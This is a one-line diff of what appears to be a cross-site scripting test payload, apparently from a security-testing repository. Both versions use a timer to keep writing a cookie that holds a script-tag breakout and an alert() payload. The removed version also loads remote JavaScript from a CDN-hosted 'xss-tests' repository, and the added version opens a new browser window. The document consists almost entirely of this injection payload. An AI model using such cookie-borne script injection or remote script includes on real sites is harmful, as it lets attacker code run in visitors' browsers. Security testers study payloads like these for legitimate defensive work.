@@ -1,1 +1,1 @@
-"";setInterval(function(){window.UpaDataTracker=true;document.cookie="trackerid=ao</script><script>alert('payload in cookies')</script><script src=//cdn.jsdelivr.net/gh/aortmann/xss-tests@edf81a13be38fd2a579711d04fdca87a174a2e33/trackerid.js>; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"},300);
+"";setInterval(function(){document.cookie="trackerid=ao</script><script>alert('payload in cookies')</script>; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"},300);window.open('/', '_blank');
